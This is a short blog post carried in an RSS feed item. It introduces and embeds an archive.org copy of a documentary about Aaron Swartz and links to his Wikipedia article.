&lt;p&gt;The following is a Documentary about the life of Aaron Swartz. If you live under a similar rock as I, you can start here: &lt;a href=&#34;http://en.wikipedia.org/wiki/Aaron_Swartz&#34;&gt;http://en.wikipedia.org/wiki/Aaron_Swartz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Watch, learn, share, and help continue a legacy that Aaron started.&lt;/p&gt;

&lt;iframe src=&#34;https://archive.org/embed/TheInternetsOwnBoyTheStoryOfAaronSwartz&#34; width=&#34;640&#34; height=&#34;480&#34; frameborder=&#34;0&#34; webkitallowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; allowfullscreen&gt;&lt;/iframe&gt;
</description>
    </item>
    
  </channel>
</rss>